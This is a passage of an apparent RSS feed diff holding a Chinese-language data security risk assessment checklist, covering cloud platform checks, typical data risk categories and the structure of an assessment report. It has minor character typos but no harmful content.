+&lt;li&gt;云数据备份恢复机制：云数据备份和恢复机制是否完善，数据备份策路、备份周期、备份存储、数据恢复策略，恢复验证等是否符合安全需要&lt;/li&gt;
+&lt;li&gt;风险和安全评估：云平台开展数据安全风险评估、云计算服务安全评估等情况&lt;/li&gt;
+&lt;li&gt;云平台基础设施：云平台基础设施部署和运维情况&lt;/li&gt;
+&lt;li&gt;云安全管理中心管控：云安全管理中心管控情况&lt;/li&gt;
+&lt;li&gt;云数据迁移安全：云数据迁移安全保障情况&lt;/li&gt;
+&lt;li&gt;云平台数据出境：云平台数据出境安全情況&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【风险识别】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;9. 典型数据安全风险类别&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;数据泄漏风险：由于数据窃取、爬取、脱库、撞库等安全威胁，或者缺饭有效的安全措施、人员操作失误或有意盗取等，导致数据泄露、恶意窃取、未授权访问等影响数据保密性的风险&lt;/li&gt;
+&lt;li&gt;数据篡改风险：由于数据注入、中问人攻击等安全威胁，或者缺失有效的安全措施、人员有意或无意操作等，导致数据被末授板篡改等影响数据完整性的风险&lt;/li&gt;
+&lt;li&gt;数据破坏风险：由于拒绝服务攻击、自然灾害、嵌入恶意代码、数据污染、设备故障等安全威胁，或者缺失有效的安全措施、人员有意或无意操作等，导致数据被破坏、毁损、数据质量下降等影响数据可用性的风险&lt;/li&gt;
+&lt;li&gt;数据丢失风险：由于数据过载、软硬件故障、备份失效、链路过载等问题，或者缺乏有效的安全措施、人员有意或无意操作等，导致数据丢失、难以恢复等安全风险&lt;/li&gt;
+&lt;li&gt;数据滥用风险：由于缺乏授权访问控制、权限管控等有效的安全管控措施、人员有意或无意操作等，导致数据被未授权或超出授权范围使用、加工的风险&lt;/li&gt;
+&lt;li&gt;数据伪造风险：由于数据源欺骗、深度伪造等安全威胁，或者缺乏有效的安全措施、人员有意或无意操作等，导致数据或数据源被伪造、数据主体被仿冒等安全风险&lt;/li&gt;
+&lt;li&gt;违法违规获取数据：违反法律、行政法规等有关规定，非法或违规获取、收集数据的风险&lt;/li&gt;
+&lt;li&gt;违法违规出售数据：违反法律、行政法规等有关规定，非法或违规向他人出售、交易数据的风险&lt;/li&gt;
+&lt;li&gt;违法违规保存数据：违反法律、行政法规等有关规定，非法或违规留存数据的风险，如逾期留存、违规境外存储等&lt;/li&gt;
+&lt;li&gt;违法违规利用数据：违反法律、行政法规等有关规定，非法或违规使用、加工、委托处理数据的风险&lt;/li&gt;
+&lt;li&gt;违法违规提供数据：违反法律、行政法规等有关规定，非法或违规向他人提供、共享、交换，转移数据的风险&lt;/li&gt;
+&lt;li&gt;违法违规公开数据：违反法律、行政法规等有关规定，非法或违规公开数据的风险&lt;/li&gt;
+&lt;li&gt;违法违规购买数据：违反法律，行政法规等有关规定，非法或违规购买、收受数据的风险&lt;/li&gt;
+&lt;li&gt;违法违规出境数据：违反法律、行政法规等有关规定，非法或违规向境外提供数据的风险&lt;/li&gt;
+&lt;li&gt;超范围处理数据：数据处理活动违反必要性原则，超范围或过度收集使用个人信息或重要数据的风险&lt;/li&gt;
+&lt;li&gt;数据处理缺乏正当性：违反正当性原则，数据处理活动缺乏明确、合理的处理目的&lt;/li&gt;
+&lt;li&gt;未有效保障个人信息主体权利：由于未采取有效的个人信息保护措施、人员操作或外部威胁等，导致未能有效保障个人信息主体的知情权、决定权、限制或者拒绝个人信息处理等个人信息主体合法权利&lt;/li&gt;
+&lt;li&gt;APP违法违规收集使用个人信息：App违反个人信息监管政策或标准规范，存在违法违规收集使用个人信息行为的风险&lt;/li&gt;
+&lt;li&gt;数据处理缺乏公平公正：由于缺乏安全管控措施、人员有意或无意操作等，导致数据处理违反公平公正、诚实守信原则，侵犯其他组织或个人合法权益的风险&lt;/li&gt;
+&lt;li&gt;数据处理抵赖风险：由于外部攻击威胁、缺乏有效安全管控措施、人员有意或无意操作等，导致处理者或第三方否认数据处理行为或绕过数据安全措施等风险&lt;/li&gt;
+&lt;li&gt;数据不可控风险：由于第三方数据安全能力不足、缺乏有效的第三方管控措施、合同协议缺失、外包人员操作等，导致委托处理或合作的第三方违反法律法规或合同协议约定处理数据，造成第三方超范围处理数据，逾期留存数据，违规再转移等数据不可控风险&lt;/li&gt;
+&lt;li&gt;数据推断风险：由于未考虑数据之间的关联关系，导致从公开数据可推断出核心数据、重要数据、未公开的个人数据等，包括但不限于面向人工智能模型的推理攻击、面向基础设施的跨域推断攻击等&lt;/li&gt;
+&lt;li&gt;其他风险：其他可能影响国家安全、公共利益或组织、个人合法权益的数据安全风险&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【风险识别】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;05 评估总结与评估报送&lt;/h1&gt;
+&lt;h2&gt;1. 综合分析&lt;/h2&gt;
+&lt;p&gt;在数据安全问题清单的基础上，进行风险分级与评价并提出整改建议&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;风险分析：基于数据安全问题清单，分析可能存在的数据安全风险，多项数据安全问题可能造成同样数据安全风险，可以合并进行风险分析&lt;/li&gt;
+&lt;li&gt;风险评价：主要考虑风险一旦发生可能对本单位、本行业以及对国家安全、社会公共利益、其他组织或者个人合法权益造成影响，以及风险发生的可能性进行综合评价&lt;/li&gt;
+&lt;li&gt;分析与评价注意事项：方法可参考数据安全风险评估方法国家标准，针对分析出的每一项风险给出风险评价等级，或对每个评估对象给出综合风险等级&lt;/li&gt;
+&lt;li&gt;整改建议：结合实际情况，针对发现的数据安全问题或风险，提出管理、技术等方面或风险处置建议&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【综合分析】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;2. 评估总结&lt;/h2&gt;
+&lt;p&gt;评估报告需要提出可操作性的整改措施对策建议&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;评估概述：包括评估目的及依据、评估对象和范围、评估结论等&lt;/li&gt;
+&lt;li&gt;评估工作情况：包括评估人员、评估时间安排、评估工具和环境情况等&lt;/li&gt;
+&lt;li&gt;信息调研情况：包括数据处理者、业务和信息系统、数据资产、数据处理活动、安全措施等情况，形成的数据资产清单，数据处理活动清单，数据流转图等文件等&lt;/li&gt;
+&lt;li&gt;数据安全风险识别：包括数据安全管理、数据处理活动、数据安全技术、个人信息保护等方面识别的风险隐患和问题情况&lt;/li&gt;
+&lt;li&gt;风险综合分析：对数据安全问题可能带来的安全风险进行综合分析，视情从风险对国家安全，公共利益、行业、组织或者个人的合法权益造成的影响程度、风险发生可能性等角度对风险进行评价&lt;/li&gt;
+&lt;li&gt;整改建议：针对发现的数据安全问题或风险，提出整改措施或风险处置建议&lt;/li&gt;
+&lt;li&gt;数据安全问题清单：列出完整的数据安全问题清单，并附上关键记录和证据，若证据无法在附录中完整列出，应列出证据关键信息和序号，在提交评估报告时作为附件提交&lt;/li&gt;
+&lt;/ol&gt;
+</content:encoded></item></channel></rss>
